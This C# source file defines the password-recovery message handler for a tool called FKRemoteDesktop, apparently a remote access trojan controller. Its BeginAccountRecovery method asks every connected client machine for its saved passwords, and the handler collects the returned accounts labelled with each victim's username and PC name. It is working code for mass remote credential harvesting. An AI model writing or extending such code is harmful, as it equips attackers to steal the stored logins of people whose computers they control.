using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using System.Collections.Generic;
using System.Linq;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class PasswordRecoveryHandler : MessageProcessorBase<object>
    {
        private readonly Client[] _clients;

        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts);
        public event AccountsRecoveredEventHandler AccountsRecovered;
        private void OnAccountsRecovered(List<RecoveredAccount> accounts, string clientIdentifier)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = AccountsRecovered;
                handler?.Invoke(this, clientIdentifier, (List<RecoveredAccount>)d);
            }, accounts);
        }

        public PasswordRecoveryHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        public override bool CanExecute(IMessage message) => message is GetPasswordsResponse;

        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswordsResponse pass:
                    Execute(sender, pass);
                    break;
            }
        }

        public void BeginAccountRecovery()
        {
            var req = new GetPasswords();
            foreach (var client in _clients.Where(client => client != null))
                client.Send(req);
        }

        private void Execute(ISender client, GetPasswordsResponse message)
        {
            Client c = (Client)client;
            string userAtPc = $"{c.UserInfo.Username}@{c.UserInfo.PcName}";
            OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
        }
    }
}
